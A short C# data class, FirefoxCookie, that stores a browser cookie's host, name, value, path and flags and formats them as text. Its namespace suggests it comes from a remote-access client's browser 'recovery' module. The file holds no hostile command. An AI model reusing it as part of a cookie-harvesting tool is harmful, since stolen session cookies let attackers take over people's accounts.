using System;

namespace xClient.Core.Recovery.Browsers;

public class FirefoxCookie
{
	public string Host { get; set; }

	public string Name { get; set; }

	public string Value { get; set; }

	public string Path { get; set; }

	public DateTime ExpiresUTC { get; set; }

	public bool Secure { get; set; }

	public bool HttpOnly { get; set; }

	public bool Expired { get; set; }

	public override string ToString()
	{
		return string.Format("Domain: {1}{0}Cookie Name: {2}{0}Value: {3}{0}Path: {4}{0}Expired: {5}{0}HttpOnly: {6}{0}Secure: {7}", Environment.NewLine, Host, Name, Value, Path, Expired, HttpOnly, Secure);
	}
}
